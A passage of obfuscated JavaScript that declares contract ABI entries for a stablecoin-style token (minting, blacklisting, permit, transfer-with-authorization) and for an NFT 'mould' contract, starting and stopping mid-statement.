(_0x21e3be.inputs = [_0x58c5ee]),
  (_0x21e3be.name = "BlacklisterChanged"),
  (_0x21e3be.type = "event");
const _0x1b7c29 = {
    indexed: !0,
    internalType: "address",
    name: "burner",
    type: "address",
  },
  _0x445251 = {
    indexed: !1,
    internalType: "uint256",
    name: "amount",
    type: "uint256",
  },
  _0x58124a = { anonymous: !1 };
(_0x58124a.inputs = [_0x1b7c29, _0x445251]),
  (_0x58124a.name = "Burn"),
  (_0x58124a.type = "event");
const _0xa807e8 = {
    indexed: !0,
    internalType: "address",
    name: "newMasterMinter",
    type: "address",
  },
  _0x144c08 = { anonymous: !1 };
(_0x144c08.inputs = [_0xa807e8]),
  (_0x144c08.name = "MasterMinterChanged"),
  (_0x144c08.type = "event");
const _0x25bcac = {
    indexed: !0,
    internalType: "address",
    name: "minter",
    type: "address",
  },
  _0x29e475 = {
    indexed: !0,
    internalType: "address",
    name: "to",
    type: "address",
  },
  _0x1fc330 = {
    indexed: !1,
    internalType: "uint256",
    name: "amount",
    type: "uint256",
  },
  _0x120992 = { anonymous: !1 };
(_0x120992.inputs = [_0x25bcac, _0x29e475, _0x1fc330]),
  (_0x120992.name = "Mint"),
  (_0x120992.type = "event");
const _0x5477de = {
    indexed: !0,
    internalType: "address",
    name: "minter",
    type: "address",
  },
  _0x29d634 = {
    indexed: !1,
    internalType: "uint256",
    name: "minterAllowedAmount",
    type: "uint256",
  },
  _0x3a382f = { anonymous: !1 };
(_0x3a382f.inputs = [_0x5477de, _0x29d634]),
  (_0x3a382f.name = "MinterConfigured"),
  (_0x3a382f.type = "event");
const _0xaf5f40 = {
    indexed: !0,
    internalType: "address",
    name: "oldMinter",
    type: "address",
  },
  _0x2ad516 = { anonymous: !1 };
(_0x2ad516.inputs = [_0xaf5f40]),
  (_0x2ad516.name = "MinterRemoved"),
  (_0x2ad516.type = "event");
const _0x3be66c = {
    indexed: !1,
    internalType: "address",
    name: "previousOwner",
    type: "address",
  },
  _0x383bcd = {
    indexed: !1,
    internalType: "address",
    name: "newOwner",
    type: "address",
  },
  _0x5bd902 = { anonymous: !1 };
(_0x5bd902.inputs = [_0x3be66c, _0x383bcd]),
  (_0x5bd902.name = "OwnershipTransferred"),
  (_0x5bd902.type = "event");
const _0xf9290 = { anonymous: !1, inputs: [], name: "Pause", type: "event" },
  _0x496210 = {
    indexed: !0,
    internalType: "address",
    name: "newAddress",
    type: "address",
  },
  _0x1aea05 = { anonymous: !1 };
(_0x1aea05.inputs = [_0x496210]),
  (_0x1aea05.name = "PauserChanged"),
  (_0x1aea05.type = "event");
const _0x5ef0fb = {
    indexed: !0,
    internalType: "address",
    name: "newRescuer",
    type: "address",
  },
  _0x3acae4 = { anonymous: !1 };
(_0x3acae4.inputs = [_0x5ef0fb]),
  (_0x3acae4.name = "RescuerChanged"),
  (_0x3acae4.type = "event");
const _0x32c4d4 = {
    indexed: !0,
    internalType: "address",
    name: "from",
    type: "address",
  },
  _0x23d0e1 = {
    indexed: !0,
    internalType: "address",
    name: "to",
    type: "address",
  },
  _0x27d7a2 = {
    indexed: !1,
    internalType: "uint256",
    name: "value",
    type: "uint256",
  },
  _0x5b31a3 = { anonymous: !1 };
(_0x5b31a3.inputs = [_0x32c4d4, _0x23d0e1, _0x27d7a2]),
  (_0x5b31a3.name = "Transfer"),
  (_0x5b31a3.type = "event");
const _0x326855 = {
    indexed: !0,
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x5ca000 = { anonymous: !1 };
(_0x5ca000.inputs = [_0x326855]),
  (_0x5ca000.name = "UnBlacklisted"),
  (_0x5ca000.type = "event");
const _0x2e4ac2 = { anonymous: !1, inputs: [], name: "Unpause", type: "event" },
  _0x322fc9 = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x8ff536 = { inputs: [], name: "CANCEL_AUTHORIZATION_TYPEHASH" };
(_0x8ff536.outputs = [_0x322fc9]),
  (_0x8ff536.stateMutability = "view"),
  (_0x8ff536.type = "function");
const _0x9a87e5 = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x373040 = { inputs: [], name: "DOMAIN_SEPARATOR" };
(_0x373040.outputs = [_0x9a87e5]),
  (_0x373040.stateMutability = "view"),
  (_0x373040.type = "function");
const _0x880357 = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x3e9247 = { inputs: [], name: "PERMIT_TYPEHASH" };
(_0x3e9247.outputs = [_0x880357]),
  (_0x3e9247.stateMutability = "view"),
  (_0x3e9247.type = "function");
const _0x15ddaf = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x1ac509 = { inputs: [], name: "RECEIVE_WITH_AUTHORIZATION_TYPEHASH" };
(_0x1ac509.outputs = [_0x15ddaf]),
  (_0x1ac509.stateMutability = "view"),
  (_0x1ac509.type = "function");
const _0x5f10a4 = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x4fe33a = { inputs: [], name: "TRANSFER_WITH_AUTHORIZATION_TYPEHASH" };
(_0x4fe33a.outputs = [_0x5f10a4]),
  (_0x4fe33a.stateMutability = "view"),
  (_0x4fe33a.type = "function");
const _0x580d15 = { internalType: "address", name: "owner", type: "address" },
  _0x293b66 = { internalType: "address", name: "spender", type: "address" },
  _0x52fcd9 = { internalType: "uint256", name: "", type: "uint256" },
  _0x51afbb = {};
(_0x51afbb.inputs = [_0x580d15, _0x293b66]),
  (_0x51afbb.name = "allowance"),
  (_0x51afbb.outputs = [_0x52fcd9]),
  (_0x51afbb.stateMutability = "view"),
  (_0x51afbb.type = "function");
const _0x5d13df = { internalType: "address", name: "spender", type: "address" },
  _0x4aa5eb = { internalType: "uint256", name: "value", type: "uint256" },
  _0x4eeee0 = { internalType: "bool", name: "", type: "bool" },
  _0x40aa5d = {};
(_0x40aa5d.inputs = [_0x5d13df, _0x4aa5eb]),
  (_0x40aa5d.name = "approve"),
  (_0x40aa5d.outputs = [_0x4eeee0]),
  (_0x40aa5d.stateMutability = "nonpayable"),
  (_0x40aa5d.type = "function");
const _0x56fba0 = {
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0x4e6b6e = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x23d64d = { internalType: "bool", name: "", type: "bool" },
  _0x35e939 = {};
(_0x35e939.inputs = [_0x56fba0, _0x4e6b6e]),
  (_0x35e939.name = "authorizationState"),
  (_0x35e939.outputs = [_0x23d64d]),
  (_0x35e939.stateMutability = "view"),
  (_0x35e939.type = "function");
const _0x2471d6 = { internalType: "address", name: "account", type: "address" },
  _0x8be1b0 = { internalType: "uint256", name: "", type: "uint256" },
  _0x561912 = {};
(_0x561912.inputs = [_0x2471d6]),
  (_0x561912.name = "balanceOf"),
  (_0x561912.outputs = [_0x8be1b0]),
  (_0x561912.stateMutability = "view"),
  (_0x561912.type = "function");
const _0x134bf1 = {
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x52eb5a = {};
(_0x52eb5a.inputs = [_0x134bf1]),
  (_0x52eb5a.name = "blacklist"),
  (_0x52eb5a.outputs = []),
  (_0x52eb5a.stateMutability = "nonpayable"),
  (_0x52eb5a.type = "function");
const _0x3b168c = { internalType: "address", name: "", type: "address" },
  _0x437c2c = { inputs: [], name: "blacklister" };
(_0x437c2c.outputs = [_0x3b168c]),
  (_0x437c2c.stateMutability = "view"),
  (_0x437c2c.type = "function");
const _0x114d4d = { internalType: "uint256", name: "_amount", type: "uint256" },
  _0x270f2b = {};
(_0x270f2b.inputs = [_0x114d4d]),
  (_0x270f2b.name = "burn"),
  (_0x270f2b.outputs = []),
  (_0x270f2b.stateMutability = "nonpayable"),
  (_0x270f2b.type = "function");
const _0x515df5 = {
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0x167edd = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x4ebfd0 = { internalType: "uint8", name: "v", type: "uint8" },
  _0x27b226 = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0x45748a = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0x267799 = {};
(_0x267799.inputs = [_0x515df5, _0x167edd, _0x4ebfd0, _0x27b226, _0x45748a]),
  (_0x267799.name = "cancelAuthorization"),
  (_0x267799.outputs = []),
  (_0x267799.stateMutability = "nonpayable"),
  (_0x267799.type = "function");
const _0x4fd74a = { internalType: "address", name: "minter", type: "address" },
  _0x32452a = {
    internalType: "uint256",
    name: "minterAllowedAmount",
    type: "uint256",
  },
  _0x4d2831 = { internalType: "bool", name: "", type: "bool" },
  _0x2c1f7a = {};
(_0x2c1f7a.inputs = [_0x4fd74a, _0x32452a]),
  (_0x2c1f7a.name = "configureMinter"),
  (_0x2c1f7a.outputs = [_0x4d2831]),
  (_0x2c1f7a.stateMutability = "nonpayable"),
  (_0x2c1f7a.type = "function");
const _0x17cfd6 = { internalType: "string", name: "", type: "string" },
  _0x2efee5 = { inputs: [], name: "currency" };
(_0x2efee5.outputs = [_0x17cfd6]),
  (_0x2efee5.stateMutability = "view"),
  (_0x2efee5.type = "function");
const _0x15c98b = { internalType: "uint8", name: "", type: "uint8" },
  _0x436704 = { inputs: [], name: "decimals" };
(_0x436704.outputs = [_0x15c98b]),
  (_0x436704.stateMutability = "view"),
  (_0x436704.type = "function");
const _0x2bec5f = { internalType: "address", name: "spender", type: "address" },
  _0x28f8f2 = { internalType: "uint256", name: "decrement", type: "uint256" },
  _0x15cf2a = { internalType: "bool", name: "", type: "bool" },
  _0x5a527c = {};
(_0x5a527c.inputs = [_0x2bec5f, _0x28f8f2]),
  (_0x5a527c.name = "decreaseAllowance"),
  (_0x5a527c.outputs = [_0x15cf2a]),
  (_0x5a527c.stateMutability = "nonpayable"),
  (_0x5a527c.type = "function");
const _0x492664 = { internalType: "address", name: "spender", type: "address" },
  _0x4f2620 = { internalType: "uint256", name: "increment", type: "uint256" },
  _0x727554 = { internalType: "bool", name: "", type: "bool" },
  _0x2d06ec = {};
(_0x2d06ec.inputs = [_0x492664, _0x4f2620]),
  (_0x2d06ec.name = "increaseAllowance"),
  (_0x2d06ec.outputs = [_0x727554]),
  (_0x2d06ec.stateMutability = "nonpayable"),
  (_0x2d06ec.type = "function");
const _0x52180c = { internalType: "string", name: "tokenName", type: "string" },
  _0x397006 = { internalType: "string", name: "tokenSymbol", type: "string" },
  _0x332cca = { internalType: "string", name: "tokenCurrency", type: "string" },
  _0x5f1915 = { internalType: "uint8", name: "tokenDecimals", type: "uint8" },
  _0x5772a0 = {
    internalType: "address",
    name: "newMasterMinter",
    type: "address",
  },
  _0x5303d5 = { internalType: "address", name: "newPauser", type: "address" },
  _0x3fb8b1 = {
    internalType: "address",
    name: "newBlacklister",
    type: "address",
  },
  _0x4749ed = { internalType: "address", name: "newOwner", type: "address" },
  _0x29ce43 = {};
(_0x29ce43.inputs = [
  _0x52180c,
  _0x397006,
  _0x332cca,
  _0x5f1915,
  _0x5772a0,
  _0x5303d5,
  _0x3fb8b1,
  _0x4749ed,
]),
  (_0x29ce43.name = "initialize"),
  (_0x29ce43.outputs = []),
  (_0x29ce43.stateMutability = "nonpayable"),
  (_0x29ce43.type = "function");
const _0x145cfd = { internalType: "string", name: "newName", type: "string" },
  _0x23d30b = {};
(_0x23d30b.inputs = [_0x145cfd]),
  (_0x23d30b.name = "initializeV2"),
  (_0x23d30b.outputs = []),
  (_0x23d30b.stateMutability = "nonpayable"),
  (_0x23d30b.type = "function");
const _0x264261 = {
    internalType: "address",
    name: "lostAndFound",
    type: "address",
  },
  _0x3b9d80 = {};
(_0x3b9d80.inputs = [_0x264261]),
  (_0x3b9d80.name = "initializeV2_1"),
  (_0x3b9d80.outputs = []),
  (_0x3b9d80.stateMutability = "nonpayable"),
  (_0x3b9d80.type = "function");
const _0x31b0a1 = {
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x30c28c = { internalType: "bool", name: "", type: "bool" },
  _0x51ed87 = {};
(_0x51ed87.inputs = [_0x31b0a1]),
  (_0x51ed87.name = "isBlacklisted"),
  (_0x51ed87.outputs = [_0x30c28c]),
  (_0x51ed87.stateMutability = "view"),
  (_0x51ed87.type = "function");
const _0x278fb9 = { internalType: "address", name: "account", type: "address" },
  _0x572bb3 = { internalType: "bool", name: "", type: "bool" },
  _0x4d4f1b = {};
(_0x4d4f1b.inputs = [_0x278fb9]),
  (_0x4d4f1b.name = "isMinter"),
  (_0x4d4f1b.outputs = [_0x572bb3]),
  (_0x4d4f1b.stateMutability = "view"),
  (_0x4d4f1b.type = "function");
const _0x444333 = { internalType: "address", name: "", type: "address" },
  _0x429010 = { inputs: [], name: "masterMinter" };
(_0x429010.outputs = [_0x444333]),
  (_0x429010.stateMutability = "view"),
  (_0x429010.type = "function");
const _0x4bfa01 = { internalType: "address", name: "_to", type: "address" },
  _0x398422 = { internalType: "uint256", name: "_amount", type: "uint256" },
  _0x139a4d = { internalType: "bool", name: "", type: "bool" },
  _0x42f66d = {};
(_0x42f66d.inputs = [_0x4bfa01, _0x398422]),
  (_0x42f66d.name = "mint"),
  (_0x42f66d.outputs = [_0x139a4d]),
  (_0x42f66d.stateMutability = "nonpayable"),
  (_0x42f66d.type = "function");
const _0x128655 = { internalType: "address", name: "minter", type: "address" },
  _0x1eeb05 = { internalType: "uint256", name: "", type: "uint256" },
  _0x20695d = {};
(_0x20695d.inputs = [_0x128655]),
  (_0x20695d.name = "minterAllowance"),
  (_0x20695d.outputs = [_0x1eeb05]),
  (_0x20695d.stateMutability = "view"),
  (_0x20695d.type = "function");
const _0x1fe9ae = { internalType: "string", name: "", type: "string" },
  _0x3dbaea = { inputs: [], name: "name" };
(_0x3dbaea.outputs = [_0x1fe9ae]),
  (_0x3dbaea.stateMutability = "view"),
  (_0x3dbaea.type = "function");
const _0x30ffe5 = { internalType: "address", name: "owner", type: "address" },
  _0x1d1abf = { internalType: "uint256", name: "", type: "uint256" },
  _0x5ee16d = {};
(_0x5ee16d.inputs = [_0x30ffe5]),
  (_0x5ee16d.name = "nonces"),
  (_0x5ee16d.outputs = [_0x1d1abf]),
  (_0x5ee16d.stateMutability = "view"),
  (_0x5ee16d.type = "function");
const _0x3b4cac = { internalType: "address", name: "", type: "address" },
  _0x4263ad = { inputs: [], name: "owner" };
(_0x4263ad.outputs = [_0x3b4cac]),
  (_0x4263ad.stateMutability = "view"),
  (_0x4263ad.type = "function");
const _0x1df544 = {
    inputs: [],
    name: "pause",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  _0x3d8955 = { internalType: "bool", name: "", type: "bool" },
  _0x150fef = { inputs: [], name: "paused" };
(_0x150fef.outputs = [_0x3d8955]),
  (_0x150fef.stateMutability = "view"),
  (_0x150fef.type = "function");
const _0x1b6258 = { internalType: "address", name: "", type: "address" },
  _0x9392d8 = { inputs: [], name: "pauser" };
(_0x9392d8.outputs = [_0x1b6258]),
  (_0x9392d8.stateMutability = "view"),
  (_0x9392d8.type = "function");
const _0x347260 = { internalType: "address", name: "owner", type: "address" },
  _0x2cc596 = { internalType: "address", name: "spender", type: "address" },
  _0x1753ee = { internalType: "uint256", name: "value", type: "uint256" },
  _0x14cf56 = { internalType: "uint256", name: "deadline", type: "uint256" },
  _0x282f0e = { internalType: "uint8", name: "v", type: "uint8" },
  _0x36c8f9 = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0x56e272 = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0x1509be = {};
(_0x1509be.inputs = [
  _0x347260,
  _0x2cc596,
  _0x1753ee,
  _0x14cf56,
  _0x282f0e,
  _0x36c8f9,
  _0x56e272,
]),
  (_0x1509be.name = "permit"),
  (_0x1509be.outputs = []),
  (_0x1509be.stateMutability = "nonpayable"),
  (_0x1509be.type = "function");
const _0x6b1273 = { internalType: "address", name: "from", type: "address" },
  _0x573121 = { internalType: "address", name: "to", type: "address" },
  _0x4e97a5 = { internalType: "uint256", name: "value", type: "uint256" },
  _0x26cdcd = { internalType: "uint256", name: "validAfter", type: "uint256" },
  _0x4e34d3 = { internalType: "uint256", name: "validBefore", type: "uint256" },
  _0x370d09 = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x1c98a9 = { internalType: "uint8", name: "v", type: "uint8" },
  _0x1a73f7 = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0x1b6b71 = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0x11cbad = {};
(_0x11cbad.inputs = [
  _0x6b1273,
  _0x573121,
  _0x4e97a5,
  _0x26cdcd,
  _0x4e34d3,
  _0x370d09,
  _0x1c98a9,
  _0x1a73f7,
  _0x1b6b71,
]),
  (_0x11cbad.name = "receiveWithAuthorization"),
  (_0x11cbad.outputs = []),
  (_0x11cbad.stateMutability = "nonpayable"),
  (_0x11cbad.type = "function");
const _0x2495cc = { internalType: "address", name: "minter", type: "address" },
  _0x449fd5 = { internalType: "bool", name: "", type: "bool" },
  _0x34ea05 = {};
(_0x34ea05.inputs = [_0x2495cc]),
  (_0x34ea05.name = "removeMinter"),
  (_0x34ea05.outputs = [_0x449fd5]),
  (_0x34ea05.stateMutability = "nonpayable"),
  (_0x34ea05.type = "function");
const _0x5e57a0 = {
    internalType: "contract IERC20",
    name: "tokenContract",
    type: "address",
  },
  _0x1b9ba1 = { internalType: "address", name: "to", type: "address" },
  _0x3274b2 = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x200a7e = {};
(_0x200a7e.inputs = [_0x5e57a0, _0x1b9ba1, _0x3274b2]),
  (_0x200a7e.name = "rescueERC20"),
  (_0x200a7e.outputs = []),
  (_0x200a7e.stateMutability = "nonpayable"),
  (_0x200a7e.type = "function");
const _0x4c0335 = { internalType: "address", name: "", type: "address" },
  _0x5d8fc8 = { inputs: [], name: "rescuer" };
(_0x5d8fc8.outputs = [_0x4c0335]),
  (_0x5d8fc8.stateMutability = "view"),
  (_0x5d8fc8.type = "function");
const _0xd03561 = { internalType: "string", name: "", type: "string" },
  _0x2077bf = { inputs: [], name: "symbol" };
(_0x2077bf.outputs = [_0xd03561]),
  (_0x2077bf.stateMutability = "view"),
  (_0x2077bf.type = "function");
const _0x23c749 = { internalType: "uint256", name: "", type: "uint256" },
  _0x16a426 = { inputs: [], name: "totalSupply" };
(_0x16a426.outputs = [_0x23c749]),
  (_0x16a426.stateMutability = "view"),
  (_0x16a426.type = "function");
const _0x19ccc2 = { internalType: "address", name: "to", type: "address" },
  _0x51759e = { internalType: "uint256", name: "value", type: "uint256" },
  _0x58a7bc = { internalType: "bool", name: "", type: "bool" },
  _0xe67d12 = {};
(_0xe67d12.inputs = [_0x19ccc2, _0x51759e]),
  (_0xe67d12.name = "transfer"),
  (_0xe67d12.outputs = [_0x58a7bc]),
  (_0xe67d12.stateMutability = "nonpayable"),
  (_0xe67d12.type = "function");
const _0xa1c8b8 = { internalType: "address", name: "from", type: "address" },
  _0x3f6057 = { internalType: "address", name: "to", type: "address" },
  _0x202ee0 = { internalType: "uint256", name: "value", type: "uint256" },
  _0xdb4770 = { internalType: "bool", name: "", type: "bool" },
  _0x16ba12 = {};
(_0x16ba12.inputs = [_0xa1c8b8, _0x3f6057, _0x202ee0]),
  (_0x16ba12.name = "transferFrom"),
  (_0x16ba12.outputs = [_0xdb4770]),
  (_0x16ba12.stateMutability = "nonpayable"),
  (_0x16ba12.type = "function");
const _0x7b7ae1 = {
    internalType: "address",
    name: "newOwner",
    type: "address",
  },
  _0x5da533 = {};
(_0x5da533.inputs = [_0x7b7ae1]),
  (_0x5da533.name = "transferOwnership"),
  (_0x5da533.outputs = []),
  (_0x5da533.stateMutability = "nonpayable"),
  (_0x5da533.type = "function");
const _0x2b0bef = { internalType: "address", name: "from", type: "address" },
  _0x317f9a = { internalType: "address", name: "to", type: "address" },
  _0x263622 = { internalType: "uint256", name: "value", type: "uint256" },
  _0x21dcaf = { internalType: "uint256", name: "validAfter", type: "uint256" },
  _0xca99a9 = { internalType: "uint256", name: "validBefore", type: "uint256" },
  _0x2fb02c = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x4f0ded = { internalType: "uint8", name: "v", type: "uint8" },
  _0x3c5595 = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0xeb66a1 = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0x3331f0 = {};
(_0x3331f0.inputs = [
  _0x2b0bef,
  _0x317f9a,
  _0x263622,
  _0x21dcaf,
  _0xca99a9,
  _0x2fb02c,
  _0x4f0ded,
  _0x3c5595,
  _0xeb66a1,
]),
  (_0x3331f0.name = "transferWithAuthorization"),
  (_0x3331f0.outputs = []),
  (_0x3331f0.stateMutability = "nonpayable"),
  (_0x3331f0.type = "function");
const _0x5ac940 = {
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x535545 = {};
(_0x535545.inputs = [_0x5ac940]),
  (_0x535545.name = "unBlacklist"),
  (_0x535545.outputs = []),
  (_0x535545.stateMutability = "nonpayable"),
  (_0x535545.type = "function");
const _0x305e72 = {
    inputs: [],
    name: "unpause",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  _0x191d69 = {
    internalType: "address",
    name: "_newBlacklister",
    type: "address",
  },
  _0x4c82f7 = {};
(_0x4c82f7.inputs = [_0x191d69]),
  (_0x4c82f7.name = "updateBlacklister"),
  (_0x4c82f7.outputs = []),
  (_0x4c82f7.stateMutability = "nonpayable"),
  (_0x4c82f7.type = "function");
const _0x3833f9 = {
    internalType: "address",
    name: "_newMasterMinter",
    type: "address",
  },
  _0x47d269 = {};
(_0x47d269.inputs = [_0x3833f9]),
  (_0x47d269.name = "updateMasterMinter"),
  (_0x47d269.outputs = []),
  (_0x47d269.stateMutability = "nonpayable"),
  (_0x47d269.type = "function");
const _0x34a561 = {
    internalType: "address",
    name: "_newPauser",
    type: "address",
  },
  _0x3f53ef = {};
(_0x3f53ef.inputs = [_0x34a561]),
  (_0x3f53ef.name = "updatePauser"),
  (_0x3f53ef.outputs = []),
  (_0x3f53ef.stateMutability = "nonpayable"),
  (_0x3f53ef.type = "function");
const _0x49195b = {
    internalType: "address",
    name: "newRescuer",
    type: "address",
  },
  _0x11b8be = {};
(_0x11b8be.inputs = [_0x49195b]),
  (_0x11b8be.name = "updateRescuer"),
  (_0x11b8be.outputs = []),
  (_0x11b8be.stateMutability = "nonpayable"),
  (_0x11b8be.type = "function");
const _0x48f852 = { internalType: "string", name: "", type: "string" },
  _0x27a652 = { inputs: [], name: "version" };
(_0x27a652.outputs = [_0x48f852]),
  (_0x27a652.stateMutability = "view"),
  (_0x27a652.type = "function");
const _0x3757e5 = {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  _0x4418c2 = {
    indexed: !0,
    internalType: "address",
    name: "owner",
    type: "address",
  },
  _0x51e8d8 = {
    indexed: !0,
    internalType: "address",
    name: "approved",
    type: "address",
  },
  _0x1657ba = {
    indexed: !0,
    internalType: "uint256",
    name: "tokenId",
    type: "uint256",
  },
  _0x5d967c = { anonymous: !1 };
(_0x5d967c.inputs = [_0x4418c2, _0x51e8d8, _0x1657ba]),
  (_0x5d967c.name = "Approval"),
  (_0x5d967c.type = "event");
const _0x24c27a = {
    indexed: !0,
    internalType: "address",
    name: "owner",
    type: "address",
  },
  _0xf1c605 = {
    indexed: !0,
    internalType: "address",
    name: "operator",
    type: "address",
  },
  _0x20ff7e = {
    indexed: !1,
    internalType: "bool",
    name: "approved",
    type: "bool",
  },
  _0x28ee4f = { anonymous: !1 };
(_0x28ee4f.inputs = [_0x24c27a, _0xf1c605, _0x20ff7e]),
  (_0x28ee4f.name = "ApprovalForAll"),
  (_0x28ee4f.type = "event");
const _0x4804e0 = {
    indexed: !1,
    internalType: "uint256",
    name: "NFTId",
    type: "uint256",
  },
  _0xc6f092 = { anonymous: !1 };
(_0xc6f092.inputs = [_0x4804e0]),
  (_0xc6f092.name = "CloseNFTWindow"),
  (_0xc6f092.type = "event");
const _0x393202 = {
    indexed: !1,
    internalType: "uint256",
    name: "NFTId",
    type: "uint256",
  },
  _0x5714ee = {
    indexed: !1,
    internalType: "uint256",
    name: "tokenId",
    type: "uint256",
  },
  _0x1f3d94 = {
    indexed: !1,
    internalType: "address",
    name: "recipient",
    type: "address",
  },
  _0x146e2e = { anonymous: !1 };
(_0x146e2e.inputs = [_0x393202, _0x5714ee, _0x1f3d94]),
  (_0x146e2e.name = "NewNFTCreatedFor"),
  (_0x146e2e.type = "event");
const _0x43507e = {
    indexed: !1,
    internalType: "uint256",
    name: "NFTIndex",
    type: "uint256",
  },
  _0x3ad65c = {
    indexed: !1,
    internalType: "string",
    name: "artworkHashIPFS",
    type: "string",
  },
  _0x59953e = {
    indexed: !1,
    internalType: "string",
    name: "artworkHashArweave",
    type: "string",
  },
  _0x5aa203 = {
    indexed: !1,
    internalType: "string",
    name: "artistName",
    type: "string",
  },
  _0x2d66d6 = {
    indexed: !1,
    internalType: "uint256",
    name: "editionSize",
    type: "uint256",
  },
  _0x2b56f3 = {
    indexed: !1,
    internalType: "string",
    name: "artTitle",
    type: "string",
  },
  _0x353ffc = {
    indexed: !1,
    internalType: "string",
    name: "artworkType",
    type: "string",
  },
  _0x1852a8 = {
    indexed: !1,
    internalType: "string",
    name: "artworkSeries",
    type: "string",
  },
  _0x4069b8 = { anonymous: !1 };
(_0x4069b8.inputs = [
  _0x43507e,
  _0x3ad65c,
  _0x59953e,
  _0x5aa203,
  _0x2d66d6,
  _0x2b56f3,
  _0x353ffc,
  _0x1852a8,
]),
  (_0x4069b8.name = "NewNFTMouldCreated"),
  (_0x4069b8.type = "event");
const _0x259c8e = {
    indexed: !1,
    internalType: "uint256",
    name: "NFTIndex",
    type: "uint256",
  },
  _0x3d65b1 = {
    indexed: !1,
    internalType: "address",
    name: "signatureAddress",
    type: "address",
  },
  _0x39222d = {
    indexed: !1,
    internalType: "string",
    name: "signatureHash",
    type: "string",
  },
  _0x287019 = {
    indexed: !1,
    internalType: "string",
    name: "signatureMessage",
    type: "string",
  },
  _0x2df6e9 = { anonymous: !1 };
(_0x2df6e9.inputs = [_0x259c8e, _0x3d65b1, _0x39222d, _0x287019]),
  (_0x2df6e9.name = "NewNFTMouldSignatures"),
  (_0x2df6e9.type = "event");
const _0x36442f = {
    indexed: !0,
    internalType: "address",
    name: "previousOwner",
    type: "address",
  },
  _0x18c4d3 = {
    indexed: !0,
    internalType: "address",
    name: "newOwner",
    type: "address",
  },
  _0x2c209f = { anonymous: !1 };
(_0x2c209f.inputs = [_0x36442f, _0x18c4d3]),
  (_0x2c209f.name = "OwnershipTransferred"),
  (_0x2c209f.type = "event");
const _0x6e1567 = {
    indexed: !0,
    internalType: "address",
    name: "from",
    type: "address",
  },
  _0x4084dd = {
    indexed: !0,
    internalType: "address",
    name: "to",
    type: "address",
  },
  _0x18f21c = {
    indexed: !0,
    internalType: "uint256",
    name: "tokenId",
    type: "uint256",
  },
  _0x754e4a = { anonymous: !1 };
(_0x754e4a.inputs = [_0x6e1567, _0x4084dd, _0x18f21c]),
  (_0x754e4a.name = "Transfer"),
  (_0x754e4a.type = "event");
const _0x4eb3d9 = { internalType: "uint256", name: "NFTId", type: "uint256" },
  _0x55677d = { internalType: "address", name: "_recipient", type: "address" },
  _0x50f239 = {};
(_0x50f239.inputs = [_0x4eb3d9, _0x55677d]),
  (_0x50f239.name = "NFTMachineFor"),
  (_0x50f239.outputs = []),
  (_0x50f239.stateMutability = "nonpayable"),
  (_0x50f239.type = "function");
const _0x208834 = { internalType: "uint256", name: "NFTId", type: "uint256" },
  _0x26a0ca = { internalType: "string", name: "hashIPFS", type: "string" },
  _0x1c969f = { internalType: "string", name: "hashArweave", type: "string" },
  _0x46ad35 = { internalType: "string", name: "artworkType", type: "string" },
  _0x35b0db = {
    internalType: "uint256",
    name: "unmintedEditions",
    type: "uint256",
  },
  _0x47feee = {};
(_0x47feee.inputs = [_0x208834]),
  (_0x47feee.name = "NFTMouldFileData"),
  (_0x47feee.outputs = [_0x26a0ca, _0x1c969f, _0x46ad35, _0x35b0db]),
  (_0x47feee.stateMutability = "view"),
  (_0x47feee.type = "function");
const _0xa49b41 = { internalType: "uint256", name: "NFTId", type: "uint256" },
  _0x1d5bda = { internalType: "string", name: "artistName", type: "string" },
  _0x233803 = { internalType: "string", name: "artistNote", type: "string" },
  _0xb5ab41 = { internalType: "uint256", name: "editionSize", type: "uint256" },
  _0x11d21c = { internalType: "string", name: "artTitle", type: "string" },
  _0x77cbd7 = { internalType: "string", name: "boxDetails", type: "string" },
  _0xf16963 = { internalType: "bool", name: "isActive", type: "bool" },
  _0x32eca2 = {};
(_0x32eca2.inputs = [_0xa49b41]),
  (_0x32eca2.name = "NFTMouldMetadata"),
  (_0x32eca2.outputs = [
    _0x1d5bda,
    _0x233803,
    _0xb5ab41,
    _0x11d21c,
    _0x77cbd7,
    _0xf16963,
  ]),
  (_0x32eca2.stateMutability = "view"),
  (_0x32eca2.type = "function");
const _0x287c64 = { internalType: "uint256", name: "NFTId", type: "uint256" },
  _0x1da852 = {
    internalType: "address",
    name: "signatureAddress",
    type: "address",
  },
  _0x4df381 = { internalType: "string", name: "signatureHash", type: "string" },
  _0x5ea333 = {
    internalType: "string",
    name: "signatureMessage",
    type: "string",
  },
  _0x340e63 = {};
(_0x340e63.inputs = [_0x287c64]),
  (_0x340e63.name = "NFTMouldSignatureData"),
  (_0x340e63.outputs = [_0x1da852, _0x4df381, _0x5ea333]),
  (_0x340e63.stateMutability = "view"),
  (_0x340e63.type = "function");
const _0x3b0ed0 = { internalType: "address", name: "to", type: "address" },
  _0x2e1e47 = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x13d867 = {};
(_0x13d867.inputs = [_0x3b0ed0, _0x2e1e47]),
  (_0x13d867.name = "approve"),
  (_0x13d867.outputs = []),
  (_0x13d867.stateMutability = "nonpayable"),
